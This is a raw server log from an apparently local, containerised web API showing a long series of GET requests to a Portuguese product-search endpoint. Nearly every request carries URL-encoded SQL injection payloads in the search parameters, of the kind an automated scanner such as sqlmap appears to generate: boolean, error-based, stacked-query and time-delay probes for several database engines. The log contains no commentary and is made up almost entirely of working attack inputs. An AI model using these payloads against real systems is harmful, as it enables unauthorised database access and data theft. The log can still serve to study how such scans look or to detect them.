api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:51708 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5793%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285793%3D5793%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51714 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5793%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285793%3D5793%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FQzDx&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51730 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6539%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286539%3D6539%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27WgwI%27%3D%27WgwI&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51732 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6539%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286539%3D6539%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27uFaH%27%3D%27uFaH&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51740 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6539%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286539%3D6539%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283848%3D3848&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51754 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6539%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286539%3D6539%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51768 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6539%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286539%3D6539%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FlSBl&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51770 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qzjjq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288630%3D8630%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qjqxq%27%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51782 - "GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51784 - "GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51796 - "GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51800 - "GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51822 - "GET /produtos/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51834 - "GET /produtos/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51842 - "GET /produtos/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51808 - "GET /produtos/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51868 - "GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2875%29%7C%7CCHR%2872%29%7C%7CCHR%2875%29%7C%7CCHR%28122%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51874 - "GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2875%29%7C%7CCHR%2872%29%7C%7CCHR%2875%29%7C%7CCHR%28122%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51852 - "GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2875%29%7C%7CCHR%2872%29%7C%7CCHR%2875%29%7C%7CCHR%28122%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51888 - "GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2875%29%7C%7CCHR%2872%29%7C%7CCHR%2875%29%7C%7CCHR%28122%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51886 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F2881%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29Wxzq%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27bRpD%27%3D%27bRpD&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51896 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F2881%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29Wxzq%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27vUgP%27%3D%27vUgP&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51900 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F2881%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29Wxzq%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282432%3D2432&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51912 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F2881%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29Wxzq%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51920 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F2881%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29Wxzq%29--%2F%2A%2A%2FyReh&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51930 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7347%3D%28SELECT%2F%2A%2A%2F7347%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27SDaK%27%3D%27SDaK&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51942 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F7347%3D%28SELECT%2F%2A%2A%2F7347%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27JVjL%27%3D%27JVjL&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51956 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F7347%3D%28SELECT%2F%2A%2A%2F7347%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%286351%3D6351&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51970 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7347%3D%28SELECT%2F%2A%2A%2F7347%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51988 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F7347%3D%28SELECT%2F%2A%2A%2F7347%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2Fzdmt&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51974 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27wArG%27%3D%27wArG&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:51992 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27mpEv%27%3D%27mpEv&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52012 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%288396%3D8396&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52006 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52026 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FrtNg&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52030 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9641%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2874%29%7C%7CCHR%28101%29%7C%7CCHR%2888%29%7C%7CCHR%2874%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27PjWP%27%3D%27PjWP&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52036 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9641%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2874%29%7C%7CCHR%28101%29%7C%7CCHR%2888%29%7C%7CCHR%2874%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27yKoa%27%3D%27yKoa&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52052 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F9641%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2874%29%7C%7CCHR%28101%29%7C%7CCHR%2888%29%7C%7CCHR%2874%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281608%3D1608&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52034 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9641%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2874%29%7C%7CCHR%28101%29%7C%7CCHR%2888%29%7C%7CCHR%2874%29%2C5%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52062 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9641%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2874%29%7C%7CCHR%28101%29%7C%7CCHR%2888%29%7C%7CCHR%2874%29%2C5%29--%2F%2A%2A%2FYWbV&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52070 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2Fxwdu&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52082 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F2560--%2F%2A%2A%2FdpGF&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52100 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FOguv&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52108 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F8234--%2F%2A%2A%2FQNaB&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52092 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FLheL&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52110 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5996--%2F%2A%2A%2FBTMl&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52122 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FjqXX&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52138 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F2907--%2F%2A%2A%2FdAqM&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52168 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FIfcT&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52184 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5319--%2F%2A%2A%2FJoXT&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52186 - "GET /produtos/busca/?nome=teste&categoria=6180 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52152 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2C%28.%28%28%27%2C%28%22 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52192 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27KZXkZA%3C%27%22%3EIcpnpC HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52200 - "GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52206 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8041%3D1542%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27DYSK%27%3D%27DYSK HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52228 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2F7980%3D6136%2F%2A%2A%2FAND%2F%2A%2A%2F%27EcFz%27%3D%27EcFz HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52236 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FAND%2F%2A%2A%2F9757%3D9770%2F%2A%2A%2FAND%2F%2A%2A%2F%281187%3D1187 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52250 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F1060%3D2988 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52214 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F7567%3D6951--%2F%2A%2A%2FYllf HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52258 - "GET /produtos/busca/?nome=teste&categoria=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287911%3D8091%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27eletronicos%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F8091%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F7387%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52260 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281346%2CCONCAT%280x5c%2C0x717a6a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%281346%3D1346%2C1%29%29%29%2C0x716a717871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27KHuW%27%3D%27KHuW HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52274 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281346%2CCONCAT%280x5c%2C0x717a6a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%281346%3D1346%2C1%29%29%29%2C0x716a717871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27VmrK%27%3D%27VmrK HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52288 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281346%2CCONCAT%280x5c%2C0x717a6a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%281346%3D1346%2C1%29%29%29%2C0x716a717871%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287073%3D7073 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52294 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281346%2CCONCAT%280x5c%2C0x717a6a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%281346%3D1346%2C1%29%29%29%2C0x716a717871%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52306 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281346%2CCONCAT%280x5c%2C0x717a6a6a71%2C%28SELECT%2F%2A%2A%2F%28ELT%281346%3D1346%2C1%29%29%29%2C0x716a717871%29%29--%2F%2A%2A%2FGHbq HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52310 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3003%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283003%3D3003%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27YuOa%27%3D%27YuOa HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:52312 - "GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2F3003%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283003%3D3003%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27PmhP%27%3D%27PmhP HTTP/1.1" 200 OK
